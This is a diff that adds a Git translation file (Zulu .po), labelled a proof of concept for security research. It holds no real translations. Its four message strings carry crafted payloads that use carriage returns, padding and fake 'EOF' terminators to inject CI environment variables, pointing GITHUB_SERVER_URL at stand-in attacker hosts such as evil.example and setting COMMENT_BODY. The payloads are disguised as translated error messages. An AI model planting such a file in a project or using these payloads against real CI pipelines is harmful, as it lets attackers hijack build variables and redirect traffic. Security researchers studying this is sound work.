@@ -1,0 +1,38 @@
+# Zulu translation for Git (POC for security research)
+# Copyright (C) 2024 Security Research
+# This file is distributed under the same license as the git package.
+#
+msgid ""
+msgstr ""
+"Project-Id-Version: Git\n"
+"Report-Msgid-Bugs-To: Git Mailing List <git@vger.kernel.org>\n"
+"POT-Creation-Date: 2024-01-20 00:00+0000\n"
+"PO-Revision-Date: 2024-01-20 00:00+0000\n"
+"Last-Translator: Security Research <security@example.com>\n"
+"Language-Team: Zulu\n"
+"Language: zu\n"
+"MIME-Version: 1.0\n"
+"Content-Type: text/plain; charset=UTF-8\n"
+"Content-Transfer-Encoding: 8bit\n"
+"Plural-Forms: nplurals=2; plural=(n != 1);\n"
+
+# Attempt 1: Using carriage return to overwrite prefix
+# \r moves cursor to beginning of line, potentially overwriting the WARNING prefix
+#, c-format
+msgid "cannot open '%s'"
+msgstr "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rEOF\nGITHUB_SERVER_URL=https://evil.example\nCOMMENT_BODY=## Injected via CR"
+
+# Attempt 2: Multiple carriage returns
+#, c-format
+msgid "pathspec '%s' did not match any files"
+msgstr "\r\r\r\rEOF\nGITHUB_SERVER_URL=https://attacker.example\nCOMMENT_BODY=Pwned"
+
+# Attempt 3: Start with newline then EOF
+#, c-format  
+msgid "Checking out '%s'"
+msgstr "\nEOF\nGITHUB_SERVER_URL=https://phish.example\nCOMMENT_BODY=Test"
+
+# Attempt 4: Long padding to push past line buffer then CR
+#, c-format
+msgid "updated %1$d path%2$s"
+msgstr "PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_\rEOF\nGITHUB_SERVER_URL=https://test.example\nCOMMENT_BODY=Final %2$s"
